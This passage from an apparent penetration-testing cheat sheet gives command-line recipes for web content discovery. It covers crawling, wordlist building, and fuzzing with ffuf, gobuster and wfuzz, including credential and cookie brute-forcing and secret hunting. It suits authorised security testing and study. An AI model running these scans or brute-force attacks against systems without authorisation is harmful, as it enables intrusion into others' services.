<li><code>nmap --script=http-enum</code></li> </ul> <h4 id="network-enumeration--website---url--discovery--dirhunt"> <a href="#network-enumeration--website---url--discovery--dirhunt" class="anchor-heading" aria-labelledby="network-enumeration--website---url--discovery--dirhunt"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Dirhunt </h4> <ul> <li><a href="https://github.com/Nekmo/dirhunt">Site</a> - Interesting files (<a href="https://docs.nekmo.org/dirhunt/usage.html#flags">Flags</a>):<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Int files: -f &lt;file1&gt;,&lt;file2&gt;...</span>
<span class="c"># Int extensions: -e &lt;php&gt;,&lt;js&gt;...</span>
dirhunt <span class="nt">--limit</span> 0 http://&lt;ip&gt;/
<span class="c"># Exclude -x &lt;flags&gt;:</span>
<span class="c"># -x http,not_found,index_of,300-500</span></code></pre></div></div></li> </ul> <h4 id="network-enumeration--website---url--discovery--gospider"> <a href="#network-enumeration--website---url--discovery--gospider" class="anchor-heading" aria-labelledby="network-enumeration--website---url--discovery--gospider"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> gospider </h4> <ul> <li><a href="https://github.com/jaeles-project/gospider">Site</a> - Fast spider written in go:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Crawl dom+subdomains indefinetely</span>
gospider <span class="nt">-s</span> &lt;url&gt; <span class="nt">-d</span> 0 <span class="nt">--sitemap</span> <span class="nt">-w</span>
<span class="c"># --json - JSON output</span></code></pre></div></div></li> <li>Non-duplicated sites clean output - proxy<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gospider <span class="nt">-s</span> &lt;url&gt; <span class="nt">-p</span> http://&lt;proxy:p&gt; <span class="nt">-d</span> 0 <span class="nt">--sitemap</span> <span class="nt">-w</span> | <span class="nb">awk</span> <span class="s1">'!x[$NF]++{print $NF}'</span>
<span class="c"># Filter -&gt; Prepend /&lt;site&gt;/&amp;&amp; to awk</span></code></pre></div></div></li> <li>Or with json + cookies - no subdomains:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gospider <span class="nt">-s</span> &lt;url&gt; <span class="nt">--cookie</span> <span class="s1">'a=b; c=d'</span> <span class="nt">-d</span> 0 <span class="nt">--sitemap</span> <span class="nt">--json</span> | jq <span class="nt">-r</span> <span class="s1">'.output'</span> | <span class="nb">awk</span> <span class="s1">'!x[$0]++'</span>
<span class="c"># --whitelist-domain=&lt;regex&gt; - Dom only</span></code></pre></div></div></li> </ul> <h4 id="network-enumeration--website---url--discovery--photon"> <a href="#network-enumeration--website---url--discovery--photon" class="anchor-heading" aria-labelledby="network-enumeration--website---url--discovery--photon"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Photon </h4> <ul> <li><a href="https://github.com/s0md3v/Photon">Site</a> - OSINT crawler (<a href="https://github.com/s0md3v/Photon/wiki/Usage#piping-writing-to-stdout">stdout values</a>):<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Crawl site - show same-domain URL:</span>
photon.py <span class="nt">-u</span> <span class="s1">'http://&lt;ip-hostname&gt;'</span> <span class="nt">--only-urls</span> <span class="nt">-t</span> 5 <span class="nt">-l</span> 999 <span class="nt">--stdout</span><span class="o">=</span>internal
<span class="c"># Exclude: --exclude='/manual[1|2]'</span>

<span class="c"># Scrap content based on regex:</span>
photon.py <span class="nt">-u</span> <span class="s1">'http://&lt;ip-hostname&gt;'</span> <span class="nt">-t</span> 5 <span class="nt">-l</span> 999 <span class="nt">--stdout</span><span class="o">=</span>custom <span class="nt">-r</span> <span class="s1">'https?://[A-z0-9\._\/\-?=]+'</span>

<span class="c"># Find high entropy secrets:</span>
photon.py <span class="nt">-u</span> <span class="s1">'http://&lt;ip-hostname&gt;'</span> <span class="nt">-t</span> 5 <span class="nt">-l</span> 999 <span class="nt">--keys</span> <span class="nt">--stdout</span><span class="o">=</span>keys
<span class="c"># Check &lt;ip-hostname&gt;/{intel,files}</span>

<span class="c"># Locally clone the site:</span>
photon.py <span class="nt">-u</span> <span class="s1">'http://&lt;ip-hostname&gt;'</span> <span class="nt">-t</span> 5 <span class="nt">-l</span> 999 <span class="nt">--clone</span>
<span class="c"># Check --ninja and --wayback flags</span></code></pre></div></div></li> <li>For self-signed certs errors, find all instances of <code>requests.get()</code> and add <code>, verify=False</code> as last param - <a href="https://github.com/s0md3v/Photon/issues/156">Ref</a><div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Execute in the Photon folder</span>
<span class="nb">grep</span> <span class="nt">-r</span> <span class="s1">'requests.get('</span> | <span class="nb">cut</span> <span class="nt">-d</span>: <span class="nt">-f1</span> | xargs <span class="nt">-I</span><span class="o">{}</span> <span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'s/\(requests.get(.*\)\([,)]\)/\1, verify=False\2/'</span> <span class="o">{}</span></code></pre></div></div></li> </ul> <h4 id="network-enumeration--website---url--discovery--maryam"> <a href="#network-enumeration--website---url--discovery--maryam" class="anchor-heading" aria-labelledby="network-enumeration--website---url--discovery--maryam"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Maryam </h4> <ul> <li><a href="https://github.com/saeeddhqan/maryam">Site</a> - OSINT Data collector Framework:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Extract based on regex</span>
maryam <span class="nt">-e</span> crawl_pages <span class="nt">-d</span> &lt;ip-host&gt; <span class="nt">-r</span> <span class="s1">'https?://[A-z0-9\._\/\-?=]+'</span> <span class="nt">--thread</span> 5 <span class="nt">--limit</span> 999 <span class="nt">--more</span>
<span class="c"># Check the --wayback flag</span>
<span class="c"># Use crawler to simply crawl</span></code></pre></div></div></li> </ul> <h4 id="network-enumeration--website---url--discovery--evine"> <a href="#network-enumeration--website---url--discovery--evine" class="anchor-heading" aria-labelledby="network-enumeration--website---url--discovery--evine"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Evine </h4> <ul> <li><a href="https://github.com/saeeddhqan/evine">Site</a> - Interactive Web Crawler:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Press Enter &amp; Ctrl+Space to search</span>
evine <span class="nt">-robots</span> <span class="nt">-sitemap</span> <span class="nt">-depth</span> 999 <span class="nt">-url</span> http://&lt;ip-hostname&gt;
<span class="c"># Tab move | CtrlS save | CtrlZ exit</span>

<span class="c"># Query field</span>
&lt;ext&gt;      <span class="c"># Show all files.&lt;ext&gt;</span>
all        <span class="c"># Show all findings</span>
url        <span class="c"># Show in-scope URLs</span>
all_urls   <span class="c"># Out-scope URLs</span>
query_urls <span class="c"># In-scope URLs with ?q=</span>
script/css <span class="c"># JavaScript/CSS files</span>
cdn        <span class="c"># CDN files</span>
comment    <span class="c"># HTML comments</span>
media      <span class="c"># Non-web files: PNG, ZIP</span>
phone      <span class="c"># Phone numbers from href</span>
email      <span class="c"># In/Out-scope emails</span>
network    <span class="c"># Social Media IDs/links</span>
dns        <span class="c"># Subdomains of the site</span>
&lt;jquery&gt;   <span class="c"># Obtain selector content</span>
<span class="c"># Example: $("a").attr("href")</span></code></pre></div></div></li> <li><a href="https://www.w3schools.com/jquery/jquery_ref_html.asp">JQuery selector methods</a></li> </ul> <h4 id="network-enumeration--website---url--discovery--wappalyzer"> <a href="#network-enumeration--website---url--discovery--wappalyzer" class="anchor-heading" aria-labelledby="network-enumeration--website---url--discovery--wappalyzer"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Wappalyzer </h4> <ul> <li><a href="https://github.com/AliasIO/Wappalyzer">Site</a>/<a href="https://www.npmjs.com/package/wappalyzer">npm</a> - Identify Web Technologies:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># -a &lt;User-Agent&gt; | -P  Pretty JSON</span>
wappalyzer &lt;url&gt; <span class="nt">-p</span> <span class="nt">-r</span> <span class="nt">-P</span>
<span class="c"># -D/-m  Max depth/urls</span></code></pre></div></div></li> </ul> <h4 id="network-enumeration--website---url--discovery--arjun"> <a href="#network-enumeration--website---url--discovery--arjun" class="anchor-heading" aria-labelledby="network-enumeration--website---url--discovery--arjun"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Arjun </h4> <ul> <li><a href="https://github.com/s0md3v/Arjun">Site</a> - HTTP parameters discovery<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>arjun <span class="nt">-u</span> <span class="s1">'&lt;url&gt;'</span>
<span class="c"># -i &lt;file&gt;    - Multiple URLs</span>
<span class="c"># -m &lt;method&gt;  - GET/POST/XML/JSON</span>
<span class="c"># --stable     - Use when unstable</span>
<span class="c"># --passive [] - Use Wayback, etc</span>
<span class="c"># -w &lt;file&gt;    - Use custom wordlist</span>
<span class="c"># -oB [&lt;port&gt;] - Proxy to Burp</span></code></pre></div></div></li> </ul> <h3 id="network-enumeration--website---url--bruteforce"> <a href="#network-enumeration--website---url--bruteforce" class="anchor-heading" aria-labelledby="network-enumeration--website---url--bruteforce"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Bruteforce </h3> <h4 id="network-enumeration--website---url--bruteforce--dictionaries"> <a href="#network-enumeration--website---url--bruteforce--dictionaries" class="anchor-heading" aria-labelledby="network-enumeration--website---url--bruteforce--dictionaries"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Dictionaries </h4> <ul> <li>Use the <a href="https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content">SecLists</a>: <ul> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/common.txt">common.txt</a></li> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/RobotsDisallowed-Top1000.txt">RobotsDisallowed-Top1000.txt</a></li> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/Logins.fuzz.txt">Logins.fuzz.txt</a></li> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/Passwords.fuzz.txt">Passwords.fuzz.txt</a></li> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/Common-DB-Backups.txt">Common-DB-Backups.txt</a></li> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/quickhits.txt">quickhits.txt</a></li> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/dirsearch.txt">dirsearch.txt</a></li> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/big.txt">big.txt</a></li> </ul> </li> <li><a href="https://github.com/six2dez/OneListForAll/raw/main/onelistforallmicro.txt">onelistforallmicro.txt</a> as extra</li> <li>All in one without repeats:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">awk</span> <span class="s1">'!x[$0]++'</span> <span class="k">*</span>.txt <span class="o">&gt;</span> all.txt

<span class="c"># Order not preserved</span>
<span class="nb">sort</span> <span class="nt">-u</span> <span class="k">*</span>.txt <span class="o">&gt;</span> all.txt</code></pre></div></div></li> <li>Separate non-extensions vs extensions:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'%EXT%'</span> all.txt <span class="o">&gt;</span> no-ext-all.txt

<span class="nb">grep</span> <span class="s1">'%EXT%'</span> all.txt <span class="o">&gt;</span> ext-all.txt</code></pre></div></div></li> <li>Or all without repeats and <code>%EXT%</code>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">awk</span> <span class="s1">'{gsub(/\.?%EXT%\.?/,"")}!x[$0]++'</span> <span class="k">*</span>.txt <span class="o">&gt;</span> all.txt

<span class="c"># sed+sort variant - order not preserved</span>
<span class="nb">sed</span> <span class="s1">'s/\.\?%EXT%\.\?//'</span> <span class="k">*</span>.txt | <span class="nb">sort</span> <span class="nt">-u</span> <span class="o">&gt;</span> all.txt</code></pre></div></div></li> <li>Followed by some Web App/Server specific (Windows/Linux, IIS/Apache&#8230;) + <a href="https://gitlab.com/kalilinux/packages/dirb/-/tree/kali/master/wordlists">dirb ones</a> <ul> <li>Apache: <ul> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/Apache.fuzz.txt">Apache.fuzz.txt</a></li> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/ApacheTomcat.fuzz.txt">ApacheTomcat.fuzz.txt</a></li> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/apache.txt">apache.txt</a></li> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/tomcat.txt">tomcat.txt</a></li> </ul> </li> <li>IIS: <ul> <li><a href="https://github.com/carlospolop/hacktricks/raw/master/.gitbook/assets/iisfinal.txt">iisfinal.txt</a></li> </ul> </li> </ul> </li> <li>Remove previously used items from dict:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Using bash/zsh pipes</span>
<span class="nb">comm</span> <span class="nt">-23</span> &lt;new-dup&gt; &lt;<span class="o">(</span><span class="nb">sort</span> <span class="nt">-u</span> &lt;old-1&gt; &lt;old-2&gt;<span class="o">)</span> <span class="o">&gt;</span> &lt;new-clean&gt;</code></pre></div></div></li> <li>If case is ignored, lowercase all:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">tr</span> <span class="s1">'[:upper:]'</span> <span class="s1">'[:lower:]'</span> &lt; &lt;dict&gt;</code></pre></div></div></li> <li>Remove leading slashes if duplicates:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sed</span> <span class="s1">'s,^/\+,,'</span> &lt;dict&gt;</code></pre></div></div></li> <li>Check the behavior of trailing slashes <ul> <li>If some dirs with slashes return <code>40x</code> errors but are redirected without them, remove them all:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sed</span> <span class="s1">'s,/\+$,,'</span> &lt;dict&gt;</code></pre></div></div></li> <li>If only trailing slashes identify dirs, append a slash to items without .ext:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sed</span> <span class="s1">'s,/\+$,,;/\..\+$/!s,$,/,'</span> &lt;dict&gt;</code></pre></div></div></li> <li>If some/all dirs without slashes get redirected, duplicate all with both:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sed</span> <span class="s1">'/\/\+$/{p;s///}'</span> &lt;dict&gt;</code></pre></div></div></li> </ul> </li> <li>Use such rules with the following dictionaries as the next step: <ul> <li><a href="https://github.com/six2dez/OneListForAll/raw/main/onelistforallshort.txt">onelistforallshort.txt</a></li> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/raft-large-directories.txt">raft-large-dirs.txt</a> (<a href="https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/raft-large-directories-lowercase.txt">lowercase</a>)</li> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/raft-large-files.txt">raft-large-files.txt</a> (<a href="https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/raft-large-files-lowercase.txt">lowercase</a>)</li> </ul> </li> <li>Use <a href="https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/directory-list-2.3-big.txt">dirs-big.txt</a> as ext template for <code>html</code>, <code>txt</code>, <code>conf</code> + jsp/php/cgi or run: <ul> <li><a href="https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/raft-large-extensions.txt">raft-large-extensions.txt</a> (<a href="https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/raft-large-extensions-lowercase.txt">lower</a>)</li> <li><a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt">web-extensions.txt</a></li> </ul> </li> <li>Make <code>dirsearch</code> <code>%EXT%</code> compatible:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sed</span> <span class="s1">'/\..\+$/!{s,/\+$,,;s,$,%EXT%,;}'</span></code></pre></div></div></li> <li>Make <code>dirsearch</code> <code>%NOFORCE%</code> compatible:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sed</span> <span class="s1">'/\..\+$/s,$,%NOFORCE%,'</span></code></pre></div></div></li> <li>You may want to go back to <code>nmap</code> and execute all the <code>*vuln*</code> scripts and those Web App/Server specific before continuing</li> <li>As last resort (+ lowercase versions): <ul> <li><a href="https://github.com/berzerk0/Probable-Wordlists/tree/master/Dictionary-Style/Technical_and_Default">ProbableWL</a> &lt;- Only random sites</li> <li><a href="http://downloads.skullsecurity.org/passwords/rockyou.txt.bz2">rockyou.txt</a> &lt;- Only random sites</li> <li><a href="https://github.com/six2dez/OneListForAll">OneListForAll</a> &lt;- Desperate</li> <li><a href="https://gist.github.com/jhaddix/86a06c5dc309d08580a018c66354a056">all-wordlist.txt</a></li> </ul> </li> </ul> <h4 id="network-enumeration--website---url--bruteforce--ffuf"> <a href="#network-enumeration--website---url--bruteforce--ffuf" class="anchor-heading" aria-labelledby="network-enumeration--website---url--bruteforce--ffuf"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Ffuf </h4> <ul> <li><a href="https://github.com/ffuf/ffuf">Site</a> - Most flexible fuzzer (<a href="https://codingo.io/tools/ffuf/bounty/2020/09/17/everything-you-need-to-know-about-ffuf.html">Ref</a>):<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># FUZZ will be the param subtituted</span>
ffuf <span class="nt">-u</span> &lt;url&gt;/FUZZ <span class="nt">-c</span> <span class="nt">-ac</span> <span class="nt">-ic</span> <span class="nt">-w</span> &lt;wlist&gt;
<span class="c"># -c - color</span>
<span class="c"># -ac - Auto-calibrate filters</span>
<span class="c"># -ic - Ignore comments in &lt;wlist&gt;</span>
<span class="c">#</span>
<span class="c"># -r - Follow redirects</span>
<span class="c"># -ignore-body - Don't fetch body</span>
<span class="c"># -acc &lt;str&gt; - Custom-auto-calibrate</span>
<span class="c"># -t &lt;threads&gt; - 40 by default</span>
<span class="c"># -s - Silent mode - results only</span>
<span class="c"># -v - Full URLs and redirects</span>
<span class="c"># -o &lt;file&gt; - Save results to file</span>
<span class="c"># -or - Don't create file if empty</span>
<span class="c"># -of &lt;output-format&gt; - json/md/csv</span>
<span class="c"># -od &lt;output-directory&gt;</span>
<span class="c">#</span>
<span class="c"># &lt;ENTER&gt; to enter interactive-mode</span>
<span class="c">#  help | resume/ENTER | [queue]show</span>
<span class="c">#  fc/fl/fw/fs &lt;value&gt; | restart</span>
<span class="c">#</span>
<span class="c"># -noninteractive - Disable int-mode</span>

<span class="c"># Fuzz rate limited with variable delay</span>
ffuf <span class="nt">-u</span> &lt;url&gt;/FUZZ <span class="nt">-t</span> 4 <span class="nt">-p</span> <span class="s1">'0.5-0.6'</span> <span class="nt">-rate</span> 5 <span class="nt">-c</span> <span class="nt">-ac</span> <span class="nt">-ic</span> <span class="nt">-w</span> &lt;wlist&gt;
<span class="c"># -p &lt;delay&gt; - Fixed or variable</span>

<span class="c"># Fuzz multiple domains</span>
ffuf <span class="nt">-u</span> <span class="s1">'https://DOM/WLIST'</span> <span class="nt">-ac</span> <span class="nt">-sf</span> <span class="nt">-c</span> <span class="nt">-w</span> &lt;domlist&gt;:DOM <span class="nt">-w</span> &lt;wlist&gt;:WLIST
<span class="c"># -sf - Stop when HTTP 403 &gt; 95%</span>

<span class="c"># Fuzz params with reflective match</span>
ffuf <span class="nt">-u</span> &lt;url&gt;/?PARAM<span class="o">=</span>VAL <span class="nt">-mr</span> <span class="s2">"VAL"</span> <span class="nt">-c</span> <span class="nt">-w</span> &lt;paramlist&gt;:PARAM,&lt;valist&gt;:VAL
<span class="c"># -m pitchfork - Try same line wlist</span>
<span class="c">#   Line 1 param -&gt; Line 1 val</span>
<span class="c">#   Line 2 param -&gt; Line 2 val...</span>

<span class="c"># Fuzz extensions recursively</span>
ffuf <span class="nt">-u</span> &lt;url&gt;/FUZZ <span class="nt">-c</span> <span class="nt">-ic</span> <span class="nt">-w</span> &lt;wlist&gt; <span class="nt">-recursion</span> <span class="nt">-e</span> .bak,.zip
<span class="c"># -D - DirSearch advanced exts mode</span>
<span class="c"># -recursion-strategy default/greedy</span>

<span class="c"># Fuzz headers - Custom Auto-filter</span>
ffuf <span class="nt">-u</span> &lt;url&gt; <span class="nt">-c</span> <span class="nt">-w</span> &lt;vhostlist&gt; <span class="nt">-acc</span> <span class="s1">'www'</span> <span class="nt">-H</span> <span class="s1">'Host: FUZZ.&lt;domain&gt;'</span>

<span class="c"># Fuzz cookies through a proxy</span>
ffuf <span class="nt">-u</span> &lt;url&gt; <span class="nt">-w</span> &lt;wlist&gt; <span class="nt">-x</span> &lt;proxy&gt; <span class="nt">-c</span> <span class="nt">-b</span> <span class="s1">'admin=FUZZ'</span>
<span class="c"># -b &lt;cookies&gt; - Cookies ';' delim</span>
<span class="c"># -x &lt;socks5/http&gt;://&lt;ip&gt; - Proxy to use</span>
<span class="c"># -replay-proxy &lt;proxy&gt; - Relay</span>

<span class="c"># Fuzz POST data with PUT method</span>
ffuf <span class="nt">-u</span> &lt;url&gt; <span class="nt">-w</span> &lt;wlist&gt; <span class="nt">-X</span> PUT <span class="nt">-c</span> <span class="nt">-d</span> <span class="s1">'user=FUZZ'</span>
<span class="c"># -X &lt;method&gt; - HTTP method to use</span>
<span class="c"># -d &lt;data&gt; - POST data | JSON data</span>

<span class="c"># Fuzz creds from a request capture</span>
ffuf <span class="nt">-request</span> &lt;req&gt; <span class="nt">-c</span> <span class="nt">-ac</span> <span class="nt">-w</span> &lt;ulist&gt;:USER <span class="nt">-w</span> &lt;plist&gt;:PASS
<span class="c"># -request-proto http - Force HTTP</span>
<span class="c"># -mode pitchfork     - Use for SQLi</span>

<span class="c"># Filter-out HTTP statuses &amp; length</span>
ffuf <span class="nt">-u</span> <span class="s1">'&lt;url&gt;/FUZZ'</span> <span class="nt">-c</span> <span class="nt">-w</span> &lt;wlist&gt; <span class="nt">-fc</span> 500,403,301 <span class="nt">-fs</span> 0,1
<span class="c"># -fc &lt;codes&gt; - HTTP statuses</span>
<span class="c"># -fs &lt;sizes&gt; - HTTP sizes</span>
<span class="c"># -fw &lt;count&gt; - Word count</span>
<span class="c"># -fl &lt;count&gt; - Line count</span>
<span class="c"># -fr &lt;regex&gt; - Regex</span>

<span class="c"># Match codes and regex</span>
ffuf <span class="nt">-u</span> <span class="s1">'&lt;url&gt;/FUZZ'</span> <span class="nt">-c</span> <span class="nt">-w</span> &lt;wlist&gt; <span class="nt">-mc</span> 200,204 <span class="nt">-mr</span> <span class="s1">'[aA]dmin|pass'</span>
<span class="c"># -mc &lt;codes&gt; - HTTP statuses | all</span>
<span class="c"># -ms &lt;sizes&gt; - HTTP sizes</span>
<span class="c"># -mw &lt;count&gt; - Word count</span>
<span class="c"># -ml &lt;count&gt; - Line count</span>
<span class="c"># -mr &lt;regex&gt; - Regex</span></code></pre></div></div></li> </ul> <h4 id="network-enumeration--website---url--bruteforce--gobuster"> <a href="#network-enumeration--website---url--bruteforce--gobuster" class="anchor-heading" aria-labelledby="network-enumeration--website---url--bruteforce--gobuster"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Gobuster </h4> <ul> <li><a href="https://github.com/OJ/gobuster">Site</a> - Dir/File/DNS/VHost fuzzer:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Pay attention to 405 codes</span>
gobuster <span class="nb">dir</span> <span class="nt">-t</span> 30 <span class="nt">-u</span> &lt;url&gt; <span class="nt">-w</span> &lt;dic&gt;
<span class="c"># Add --no-error to hide bad urls</span>
<span class="c"># Use -k to ignore SSL validation</span>
<span class="c"># Use -b with the codes to ignore</span>
<span class="c"># Use -s with only the codes to show</span>
<span class="c"># Use -x with the extensions to test</span>
<span class="c"># Use -f to add a slash to the words</span>
<span class="c"># Use -a to set an User-Agent</span>
<span class="c"># or use --random-agent</span>
<span class="c"># Use -e to show the full URL match</span>
<span class="c"># Use -z to hide the progress with</span>
<span class="c"># the last resort lists as it breaks</span>
<span class="c"># Increase threads with big lists</span>
<span class="c"># Use -o to save to file</span>
<span class="c"># Use -q to hide banner and progress</span>

<span class="c"># Fuzz HTTP parameters</span>
gobuster fuzz <span class="nt">-u</span> <span class="s1">'&lt;url&gt;?FUZZ=test'</span> <span class="nt">-w</span> &lt;dic&gt;</code></pre></div></div></li> <li><a href="https://github.com/OJ/gobuster#patterns">Pattern support</a></li> </ul> <h4 id="network-enumeration--website---url--bruteforce--wfuzz"> <a href="#network-enumeration--website---url--bruteforce--wfuzz" class="anchor-heading" aria-labelledby="network-enumeration--website---url--bruteforce--wfuzz"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Wfuzz </h4> <ul> <li><a href="https://github.com/xmendez/wfuzz">Site</a> - Multi-purpose fuzzer - <a href="https://wfuzz.readthedocs.io">docs</a><div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># -&gt; Filters may glitch the terminal</span>
wfuzz <span class="nt">-w</span> &lt;wlist&gt; <span class="nt">-Z</span> <span class="nt">-c</span> <span class="s1">'&lt;url&gt;/FUZZ'</span>
<span class="c"># -Z - Ignore errors | -c - colors</span>
<span class="c"># --hh &lt;n&gt; - Filter by size</span>
<span class="c"># --hl &lt;n&gt; - Filter by lines</span>
<span class="c"># --hw &lt;n&gt; - Filter by words</span>
<span class="c"># --hc &lt;c&gt; - Filter by HTTP code</span>
<span class="c"># --hs &lt;r&gt; - Filter by PyRegex</span>
<span class="c"># Use --s[hlwcs] &lt;w&gt; for matches</span>

<span class="c"># Filter using a baseline + cookie</span>
wfuzz <span class="nt">-w</span> &lt;wlist&gt; <span class="nt">-X</span> HEAD <span class="nt">--hh</span> BBB <span class="nt">-b</span> <span class="s1">'PHP=lol'</span> <span class="nt">-c</span> <span class="s1">'&lt;url&gt;/FUZZ{nopage}'</span>
<span class="c"># First request will be &lt;url&gt;/nopage</span>

<span class="c"># Read from stdin and fuzz POST</span>
<span class="nb">sed</span> <span class="s1">'1,33d'</span> &lt;file&gt; | wfuzz <span class="nt">-z</span> stdin <span class="nt">-d</span> <span class="s1">'user=FUZZ&amp;pass=test'</span> <span class="nt">-c</span> <span class="s1">'&lt;url&gt;'</span>

<span class="c"># Fuzz HTTP Basic + follow redirect</span>
wfuzz <span class="nt">-w</span> &lt;wpwd&gt; <span class="nt">-w</span> &lt;wusr&gt; <span class="nt">--basic</span> <span class="s1">'FUZ2Z:FUZZ'</span> <span class="nt">--follow</span> <span class="nt">-c</span> <span class="s1">'&lt;url&gt;'</span>

<span class="c"># Fuzz numeric identifier</span>
wfuzz <span class="nt">-z</span> range,0-100 <span class="nt">-Z</span> <span class="nt">-c</span> <span class="s1">'&lt;url&gt;/FUZZ'</span></code></pre></div></div></li> <li><a href="https://wfuzz.readthedocs.io/en/latest/user/wfpayload.html">wfpayload</a> <b>TODO</b></li> <li>Apparently <a href="https://www.doria.fi/handle/10024/181265">still better than ffuf</a></li> </ul> <h3 id="network-enumeration--website---url--tampering"> <a href="#network-enumeration--website---url--tampering" class="anchor-heading" aria-labelledby="network-enumeration--website---url--tampering"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Tampering </h3> <h4 id="network-enumeration--website---url--tampering--wuzz"> <a href="#network-enumeration--website---url--tampering--wuzz" class="anchor-heading" aria-labelledby="network-enumeration--website---url--tampering--wuzz"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Wuzz </h4> <ul> <li><a href="https://github.com/asciimoo/wuzz">Site</a> - HTTP Client - <a href="https://github.com/asciimoo/wuzz/blob/66176b6ef86c4879975d4075d784135d56ee3e82/wuzz.go#L1553">hidden flags</a>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Ctrl-J/K: Down/Up  |Ctrl-R: Submit</span>
<span class="c"># Ctrl-E: Export Curl|Alt-H: History</span>
<span class="c"># Ctrl-S: SaveRequest|Ctrl-C: Quit</span>
wuzz http://&lt;ip-hostname&gt;
<span class="c"># Proxy: -x &lt;proxy-url&gt;</span>

<span class="c"># URLencode data + no redirect</span>
wuzz <span class="nt">--data-urlencode</span> <span class="s2">"user=&lt;hi&gt;"</span> <span class="nt">-R</span> http://&lt;ip-hostname&gt;
<span class="c"># For GET urlencode try: -X GET</span>
<span class="c"># For binary data: --data-binary &lt;d&gt;</span>
